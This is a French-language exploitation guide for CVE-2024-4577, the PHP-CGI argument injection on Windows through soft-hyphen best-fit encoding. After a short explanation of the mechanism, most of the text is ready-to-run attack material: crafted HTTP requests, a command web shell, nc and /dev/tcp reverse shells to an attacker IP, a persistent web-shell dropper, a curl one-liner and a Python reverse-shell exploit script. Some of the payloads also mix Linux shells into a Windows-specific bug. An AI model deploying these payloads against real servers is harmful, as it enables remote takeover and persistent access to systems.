# PHP-CGI Argument Injection via Best-Fit Encoding

## <mark style="color:red;">CVE-2024-4577 : PHP-CGI Argument Injection via Best-Fit Encoding</mark>

### <mark style="color:blue;">Vue d'Ensemble</mark>

**CVE-2024-4577** est une vulnérabilité critique d'injection d'arguments dans PHP-CGI qui permet une exécution de code à distance (RCE) via l'exploitation du mécanisme "Best-Fit" character encoding sur Windows.

| Propriété              | Valeur                                               |
| ---------------------- | ---------------------------------------------------- |
| **CVE ID**             | CVE-2024-4577                                        |
| **Score CVSS**         | 9.8 (Critical)                                       |
| **Versions affectées** | PHP-CGI sur Windows (toutes versions jusqu'au patch) |
| **Type**               | Argument Injection                                   |
| **Vecteur**            | HTTP Query String                                    |

***

### <mark style="color:blue;">Fondamentaux Théoriques</mark>

#### Qu'est-ce que PHP-CGI ?

PHP peut fonctionner selon plusieurs modes :

* **mod\_php** : Module intégré au serveur web (Apache)
* **PHP-FPM** : FastCGI Process Manager (recommandé)
* **PHP-CGI** : Common Gateway Interface (ancien, mais encore utilisé)

```
HTTP Request → Web Server (IIS/Apache) → PHP-CGI Process → PHP Code
```

#### Le problème du Best-Fit Encoding

Windows utilise différents "codepages" pour gérer les caractères selon la langue du système :

* **Japanese (CP932)** : Shift-JIS
* **Chinese Simplified (CP936)** : GB2312
* **Chinese Traditional (CP950)** : Big5

Le "Best-Fit" mapping transforme certains caractères Unicode en caractères ASCII "proches" :

```
Caractère Unicode → Best-Fit → ASCII
─────────────────────────────────────
Soft Hyphen (0xAD) → - (0x2D)
```

***

### <mark style="color:blue;">Mécanisme de la Vulnérabilité</mark>

#### Flux normal (non vulnérable)

```
URL : /index.php?page=about

Parsing URL :
  ↓
Query String : page=about
  ↓
Passé à PHP comme $_GET['page']
```

#### Flux vulnérable (exploitation)

```
URL : /cgi-bin/php-cgi?%ADdallow_url_include%3don
                        ↑
                   Soft hyphen (0xAD)

Windows Best-Fit Encoding :
  ↓
Transformé en : /cgi-bin/php-cgi?-dallow_url_include=on
                                  ↑
                              Normal hyphen (0x2D)

PHP-CGI interprète :
  ↓
Argument : -d allow_url_include=on
  ↓
PHP démarre avec allow_url_include activé !
```

#### Pourquoi c'est critique ?

PHP-CGI accepte des arguments de configuration via `-d` :

```bash
# Configuration normale
php-cgi -d display_errors=on script.php

# Via l'URL (exploité)
/cgi-bin/php-cgi?-d+display_errors=on
```

***

### <mark style="color:blue;">Exploitation Technique</mark>

#### Étape 1 : Activer allow\_url\_include

```
GET /cgi-bin/php-cgi?%ADdallow_url_include%3don HTTP/1.1
                      │                    │
                      │                    └─ =on (URL encoded : %3d = "=")
                      └─ Soft hyphen → devient "-d"
```

#### Étape 2 : Définir auto\_prepend\_file

```
?%ADdallow_url_include%3don%ADdauto_prepend_file%3dphp://input
  └────────────┬────────────┘ └──────────────┬──────────────┘
       Active inclusion            Exécute POST body comme PHP
```

**auto\_prepend\_file** : Fichier exécuté AVANT le script principal

```php
// Avec auto_prepend_file=php://input
// Le contenu du POST body est exécuté en premier !
```

#### Étape 3 : Envoyer le payload PHP

```http
POST /cgi-bin/php-cgi?%ADdallow_url_include%3don%ADdauto_prepend_file%3dphp://input HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

<?php system('whoami'); ?>
```

**Flux d'exécution :**

```
1. PHP-CGI démarre avec :
   - allow_url_include=on
   - auto_prepend_file=php://input

2. PHP lit php://input (le POST body)

3. Exécute : <?php system('whoami'); ?>

4. RCE obtenu !
```

***

### <mark style="color:blue;">Payloads d'Exploitation</mark>

#### Payload 1 : Commande simple

```http
POST /cgi-bin/php-cgi?%ADdallow_url_include%3don%ADdauto_prepend_file%3dphp://input HTTP/1.1

<?php system($_GET['cmd']); ?>
```

Usage :

```
/cgi-bin/php-cgi?cmd=whoami
```

#### Payload 2 : Reverse Shell (Named Pipe)

```php
<?php
$cmd = "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.10.14.17 4444 > /tmp/f";
system($cmd);
?>
```

**Explication du named pipe :**

```bash
rm /tmp/f                    # Supprime le fichier existant
mkfifo /tmp/f                # Crée un FIFO (named pipe)
cat /tmp/f | sh -i 2>&1 | nc 10.10.14.17 4444 > /tmp/f
│          │         │                           │
│          │         │                           └─ Écrit dans le pipe
│          │         └─ Envoie vers netcat
│          └─ Exécute dans shell interactif
└─ Lit depuis le pipe (nos commandes)
```

#### Payload 3 : Reverse Shell (Bash)

```php
<?php
system("bash -c 'bash -i >& /dev/tcp/10.10.14.17/4444 0>&1'");
?>
```

#### Payload 4 : Web Shell persistant

```php
<?php
file_put_contents('../shell.php', '<?php system($_GET["c"]); ?>');
echo "Shell uploaded at /shell.php";
?>
```

### Exploitation via cURL

#### Commande complète

```bash
curl -X POST \
  'http://target.com/cgi-bin/php-cgi?%ADdallow_url_include%3don%ADdauto_prepend_file%3dphp://input' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d '<?php system("id"); ?>'
```

#### Script d'exploitation automatisé

```python
#!/usr/bin/env python3
import requests
import urllib.parse

target = "http://legacy-intranet:5000"
lhost = "10.10.14.17"
lport = 4444

# Reverse shell payload
payload = f"""<?php
$sock=fsockopen("{lhost}",{lport});
exec("/bin/bash -i <&3 >&3 2>&3");
?>"""

# URL avec soft hyphen (0xAD)
url = target + "/cgi-bin/php-cgi"
params = "?%ADdallow_url_include%3don%ADdauto_prepend_file%3dphp://input"

print(f"[+] Targeting: {url}")
print(f"[+] Sending payload...")

response = requests.post(
    url + params,
    data=payload,
    headers={'Content-Type': 'application/x-www-form-urlencoded'},
    timeout=5
)

print(f"[+] Response: {response.status_code}")
```
